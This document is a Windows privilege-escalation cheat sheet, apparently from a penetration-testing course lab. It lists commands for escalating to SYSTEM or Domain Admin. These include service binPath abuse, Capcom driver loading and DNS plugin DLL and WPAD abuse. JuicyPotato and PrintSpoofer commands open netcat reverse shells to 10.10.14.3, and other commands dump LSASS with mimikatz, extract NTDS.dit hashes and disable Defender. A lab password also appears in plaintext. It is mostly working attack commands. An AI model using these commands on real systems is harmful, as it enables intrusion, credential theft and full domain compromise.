# Windows Privilege Escalation

Goal: Escalate to SYSTEM or Domain Admin.

---

# System Enumeration

systeminfo

wmic qfe

wmic product get name

[environment]::OSVersion.Version

---

# User & Privileges

whoami

whoami /priv

whoami /groups

echo %USERNAME%

net user

net localgroup

net localgroup administrators

query user

---

# Services

tasklist /svc

sc query dns

sc stop dns

sc start dns

sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

---

# Service Permissions

icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

c:\Tools\PsService.exe security AppReadiness

---

# Registry

reg query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

---

# File Ownership

dir /q C:\backups\wwwroot\web.config

takeown /f C:\backups\wwwroot\web.config

Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ | select name,directory,@{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

icacls “C:\backups\wwwroot\web.config” /grant htb-student:F

---

# Driver Abuse

cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

.\DriverView.exe /stext drivers.txt

cat drivers.txt | Select-String -pattern Capcom

EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

---

# DNS Abuse

dnscmd.exe /config /serverlevelplugindll adduser.dll

Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3

---

# JuicyPotato

c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *

---

# PrintSpoofer

c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

---

# LSASS Dump

procdump.exe -accepteula -ma lsass.exe lsass.dmp

sekurlsa::minidump lsass.dmp

sekurlsa::logonpasswords

---

# NTDS Extraction

robocopy /B E:\Windows\NTDS .\ntds ntds.dit

secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

---

# Event Log Search

wevtutil qe Security /rd:true /f:text | Select-String "/user"

wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"

Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

---

# SharpUp

.\SharpUp.exe audit

---

# Defender

Get-MpComputerStatus

Set-MpPreference -DisableRealtimeMonitoring $true

---

# AppLocker

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

---

# Tactical Notes

- Always check privileges first.
- Service binary path abuse common.
- Check unquoted service paths.
- LSASS dump gives plaintext creds.
- DNS abuse leads to DA.
- UAC bypass possible if misconfigured.
